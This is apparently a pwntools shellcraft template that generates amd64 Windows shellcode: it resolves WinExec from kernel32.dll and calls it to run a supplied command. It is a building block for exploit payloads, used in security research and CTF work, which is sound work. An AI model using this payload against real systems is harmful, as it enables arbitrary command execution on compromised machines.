<%
    from pwnlib.shellcraft import amd64, pretty
    from pwnlib.util.packing import _need_bytes
    from pwnlib.util.misc import align
%>
<%docstring>Execute a program using WinExec.

Args:
    cmd (str): The program to execute.
    cmd_show (int): nCmdShow parameter.
</%docstring>
<%page args="cmd, cmd_show = 0"/>
<%
cmd = _need_bytes(cmd)
%>

    ${amd64.windows.getprocaddress(b'WinExec', b'kernel32.dll', 'rsi')}
    ${amd64.pushstr(cmd)}
    mov rcx, rsp
    sub rsp, 0x30
    and rsp, -16
    ${amd64.mov('rdx', cmd_show)}
    call rsi
    add rsp, ${pretty(0x30+align(16, len(cmd)+1))}
